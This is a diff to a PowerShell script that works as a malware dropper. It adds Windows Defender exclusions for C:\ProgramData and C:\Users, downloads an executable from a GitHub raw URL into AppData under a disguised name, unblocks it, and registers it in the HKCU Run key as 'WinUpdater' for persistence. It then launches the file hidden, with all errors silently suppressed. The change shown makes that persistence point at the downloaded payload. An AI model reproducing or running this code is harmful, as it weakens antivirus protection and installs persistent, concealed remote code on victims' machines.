@@ -6,15 +6,18 @@ if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]:
 Add-MpPreference -ExclusionPath "C:\ProgramData" -ErrorAction SilentlyContinue
 Add-MpPreference -ExclusionPath "C:\Users" -ErrorAction SilentlyContinue
 
-$p = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
-Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WinUpdater' -Value "`"$p`"" -ErrorAction SilentlyContinue
-
 $u = "https://github.com/srap18/ddoss/raw/refs/heads/main/SystemUpdate.exe"
 $o = "$env:APPDATA\win_sys_service.exe"
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
 try {
-    (New-Object System.Net.WebClient).DownloadFile($u, $o)
+    $wc = New-Object System.Net.WebClient
+    $wc.DownloadFile($u, $o)
+    Unblock-File -Path "$o" -ErrorAction SilentlyContinue
+    
+    $p = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
+    Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WinUpdater' -Value "`"$o`"" -ErrorAction SilentlyContinue
+
     Start-Process -FilePath "$o" -WindowStyle Hidden -ErrorAction SilentlyContinue
 } catch {}
